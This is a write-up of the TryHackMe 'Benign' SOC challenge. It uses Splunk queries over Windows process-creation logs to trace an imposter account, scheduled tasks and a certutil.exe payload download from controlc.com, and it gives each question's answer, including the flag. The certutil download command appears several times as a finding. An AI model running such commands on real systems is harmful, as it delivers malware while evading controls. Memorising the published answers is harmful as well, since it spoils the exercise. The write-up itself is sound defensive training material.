# 🔬 Benign — TryHackMe Challenge Room Writeup

> **Module:** SIEM Triage for SOC | **Path:** SOC Level 1  
> **Difficulty:** Medium  
> **Tools Used:** Splunk  
> **Focus:** Host-Centric Log Analysis, LOLBIN Detection, C2 Investigation

---

## 📖 Room Overview

**Room Link:** https://tryhackme.com/room/benign

This is a challenge room — no step-by-step guidance is provided. You are given a scenario, a Splunk instance loaded with Windows process execution logs, and must investigate a compromised host independently.

The room tests your ability to:
- Write Splunk queries to search and filter process execution logs
- Identify imposter accounts and suspicious usernames
- Detect Living-off-the-Land (LOLBIN) techniques in process logs
- Trace a full C2 download chain from logs alone
- Recover malicious payload details without direct access to the file

---

## 🧠 Key Concepts

### Event ID 4688 — Process Creation
Windows Security Event ID 4688 is logged every time a new process is created on the system. It records:
- The process name and full command line
- The user account that launched it
- The hostname it ran on
- The timestamp

In this room, all logs are **Event ID 4688** — meaning every event represents a process being started on a Windows host. This makes it ideal for detecting malicious execution chains.

### Living-off-the-Land Binaries (LOLBINs)
Legitimate Windows system binaries abused by attackers to perform malicious actions — downloading files, executing code, bypassing security controls — without needing to drop custom malware that would trigger AV detection.

Common LOLBINs: `certutil.exe`, `bitsadmin.exe`, `mshta.exe`, `powershell.exe`, `wscript.exe`

---

## 📋 Scenario

> One of the client's IDS indicated a potentially suspicious process execution on a host from the **HR department**. Tools related to network information gathering and scheduled tasks were executed, confirming the suspicion. Due to limited resources, only process execution logs with **Event ID 4688** were pulled and ingested into Splunk under the index `win_eventlogs`.

**Objective:** Investigate the process logs, identify the compromised host and user, and trace the full attack chain.

**Network Segments:**
| Department | Users |
|------------|-------|
| IT | James, Moin, Katrina |
| HR | Haroon, Chris, Diana |
| Marketing | Bell, Amelia, Deepak |

**Splunk Index:** `win_eventlogs`

---

## 🔍 Investigation & Findings

### Step 1 — Scope the Investigation

Set the Splunk time range to **March 2022** to scope logs to the relevant period.

---

### Q1: How many logs are ingested from the month of March 2022?

**Answer:** `13959`

**Query:**
```splunk
index=win_eventlogs
```
Set the date range to March 1–31, 2022. The total event count is displayed below the search bar.

**Takeaway:** 13,959 process creation events across the network for one month — this is the full dataset we're working from. Everything we find will come from these logs.

---

### Step 2 — Hunt for Imposter Accounts

Clicked on the `UserName` field in Splunk — only shows top 10 values by default. Used a query to force all 11 unique usernames to surface.

---

### Q2: There seems to be an imposter account observed in the logs. What is the name of that user?

**Answer:** `Amel1a`

**Query:**
```splunk
index=win_eventlogs
| top limit=11 UserName
```

**Finding:** The known Marketing user is `Amelia` — but the logs contain `Amel1a` (with a number `1` instead of the letter `l`). A subtle username substitution — classic account impersonation for persistence.

**Takeaway:** Always look beyond the top 10 field values in Splunk. Rare or low-frequency usernames are often the most interesting.

---

### Step 3 — Identify Scheduled Task Activity

Searched for `schtasks` in the logs — the Windows binary used to create and manage scheduled tasks. Sorted results by the `CommandLine` field to identify the user running them.

---

### Q3: Which user from the HR department was observed running scheduled tasks?

**Answer:** `Chris.fort`

**Query:**
```splunk
index=win_eventlogs schtasks
```
Sorted by `CommandLine` field → only 5 commands returned, making it easy to identify the HR user running `schtasks`.

**Takeaway:** Scheduled tasks are a common persistence mechanism — MITRE T1053. Filtering by the `schtasks` binary name is a quick way to surface this activity across all users.

---

### Step 4 — Detect LOLBIN Download Activity

Searched for rare `CommandLine` values within the HR department hosts. Rare values are more likely to be malicious — normal users run the same commands repeatedly, while attackers run unusual one-off commands.

---

### Q4: Which user from the HR department executed a system process (LOLBIN) to download a payload from a file-sharing host?

**Answer:** `haroon`

**Query:**
```splunk
index=win_eventlogs HostName="*HR*"
| rare limit=20 CommandLine
```

**Finding:** One rare command line stood out immediately:
```
certutil.exe -urlcache -split -f https://controlc.com/e4d11035 benign.exe
```

This revealed:
- **LOLBIN used:** `certutil.exe`
- **C2 site:** `controlc.com`
- **Downloaded file:** `benign.exe`
- **User:** `haroon`

**Takeaway:** The `rare` command in Splunk is one of the most powerful tools for threat hunting — attackers run unusual commands that stand out immediately when you look at the statistical outliers.

---

### Q5: To bypass security controls, which system process (LOLBIN) was used to download a payload from the internet?

**Answer:** `certutil.exe`

**Identified in Q4.** `certutil.exe` is a legitimate Windows certificate management utility — commonly abused to download files from the internet using the `-urlcache -split -f` flags, bypassing many security controls since it is a trusted Microsoft binary.

**MITRE ATT&CK:** T1105 — Ingress Tool Transfer

---

### Q6: What was the date this binary was executed by the infected host? (YYYY-MM-DD)

**Answer:** `2022-03-04`

**Identified in Q4.** The timestamp on the process creation event for the `certutil.exe` command shows March 4, 2022.

---

### Q7: Which third-party site was accessed to download the malicious payload?

**Answer:** `controlc.com`

**Identified in Q4.** The full URL in the `CommandLine` field:
```
https://controlc.com/e4d11035
```

`controlc.com` is a legitimate text/file sharing site — similar to Pastebin. Attackers abuse these platforms as C2 infrastructure because traffic to them is not blocked by most firewalls.

---

### Q8: What is the name of the file that was saved on the host machine from the C2 server?

**Answer:** `benign.exe`

**Identified in Q4.** The `-f` flag in the `certutil` command specifies the output filename:
```
certutil.exe -urlcache -split -f https://controlc.com/e4d11035 benign.exe
```

The file is named `benign.exe` — an ironic name for a malicious payload, likely chosen to appear innocuous if spotted in a process list.

---

### Step 5 — Recover the Payload

Navigated to the C2 URL in a browser to recover the malicious payload contents:
```
https://controlc.com/e4d11035
```

---

### Q9: The suspicious file downloaded from the C2 server contained malicious content with the pattern THM{…}. What is that pattern?

**Answer:** `THM{KJ&*H^B0}`

**Method:** Visiting the controlc.com URL reveals the file contents including the flag.

---

### Q10: What is the URL that the infected host connected to?

**Answer:** `https://controlc.com/e4d11035`

**Identified in Q4** — the full URL from the `certutil.exe` command line.

---

## 🗺️ Full Attack Chain

```
[IDS Alert] Suspicious Process Execution — HR Department
          │
          ▼
[Imposter Account] Amel1a created (impersonating Amelia)
          │
          ▼
[Persistence] Chris.fort running schtasks (scheduled tasks)
          │
          ▼
[LOLBIN Abuse] haroon executes certutil.exe
  certutil.exe -urlcache -split -f https://controlc.com/e4d11035 benign.exe
          │
          ▼
[C2 Download] controlc.com → benign.exe downloaded to host
          │
          ▼
[Payload] THM{KJ&*H^B0} — malicious content confirmed
```

---

## 🎯 MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|----|-------------|
| Scheduled Task / Job | T1053 | `schtasks.exe` used by Chris.fort for persistence |
| Ingress Tool Transfer | T1105 | `certutil.exe` used to download payload from C2 |
| Web Service (C2) | T1102 | `controlc.com` used as C2 file hosting platform |
| Valid Accounts | T1078 | `Amel1a` imposter account created for persistence |
| Masquerading | T1036 | `benign.exe` named to appear innocuous |

---

## 🛠️ Splunk Queries Used

```splunk
# Q1 — Total event count for March 2022
index=win_eventlogs
# (Set time range to March 1–31, 2022)

# Q2 — Surface all unique usernames including rare ones
index=win_eventlogs
| top limit=11 UserName

# Q3 — Find scheduled task activity
index=win_eventlogs schtasks
# (Sort results by CommandLine field)

# Q4, Q5, Q6, Q7, Q8, Q10 — Detect LOLBIN and C2 activity in HR hosts
index=win_eventlogs HostName="*HR*"
| rare limit=20 CommandLine

# Alternative targeted search after identifying the user
index=win_eventlogs HostName="*HR*" UserName="haroon"
| table _time UserName HostName CommandLine
```

---

## 💡 Key Takeaways

1. **The `rare` command is a threat hunter's best friend.** Normal users run the same commands repeatedly — attackers run unusual one-off commands. Rare values surface anomalies instantly.

2. **LOLBINs hide in plain sight.** `certutil.exe` is a legitimate Windows tool — but `-urlcache -split -f` flags are a red flag when seen in process logs.

3. **Attackers name files to deceive.** `benign.exe` is an intentionally innocent-sounding name. Never trust a filename — look at what the process actually does.

4. **Legitimate platforms get abused for C2.** `controlc.com` is not inherently malicious — attackers use it because traffic to it goes unblocked. Same pattern as Pastebin in ItsyBitsy.

5. **One query can answer multiple questions.** The `certutil` command line revealed the LOLBIN, the C2 site, the file, the user, and the date all at once — a single pivot point that unlocked the full attack chain.

6. **Imposter accounts use subtle variations.** `Amel1a` vs `Amelia` — easy to miss if you only look at the top 10 values. Always force the full list.

---

## 📌 Room Summary

| Field | Detail |
|-------|--------|
| Room | Benign |
| Platform | TryHackMe |
| Module | SIEM Triage for SOC |
| SIEM Tool | Splunk |
| Log Index | `win_eventlogs` |
| Log Type | Windows Process Execution (Event ID 4688) |
| Compromised Department | HR |
| Compromised User | haroon |
| Imposter Account | Amel1a |
| Persistence Method | Scheduled Tasks (Chris.fort) |
| LOLBIN Used | `certutil.exe` |
| C2 Platform | controlc.com |
| Payload File | `benign.exe` |
| C2 URL | `https://controlc.com/e4d11035` |
| MITRE Techniques | T1053, T1105, T1102, T1078, T1036 |
| Difficulty | Medium |

---

> *"One query can unlock the entire attack chain — the key is knowing which question to ask first."*
